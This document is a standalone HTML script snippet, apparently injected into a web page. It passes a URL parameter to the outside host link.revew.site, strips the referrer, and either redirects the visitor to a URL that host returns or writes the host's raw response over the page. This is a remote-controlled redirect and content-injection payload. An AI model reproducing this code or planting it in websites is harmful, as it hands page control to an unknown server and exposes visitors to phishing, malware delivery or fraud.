<script>
if (!window.__x__) {
  window.__x__ = 1;
  var go = function(u){
    var m = document.createElement('meta');
    m.name='referrer'; m.content='no-referrer';
    document.head.appendChild(m);
    window.location.replace(u);
  };
  var m = new URLSearchParams(location.search).get('m');
  if (m) {
    fetch('https://link.revew.site/apifolder/api.php?m=' + m + '&cache=1')
      .then(function(r){ return r.text(); })
      .then(function(e){
        try { var j = JSON.parse(e); if (j.redirectUrl) go(j.redirectUrl); }
        catch (err) { document.open(); document.write(e); document.close(); }
      })
      .catch(function(err){ console.error(err); });
  }
}
</script>
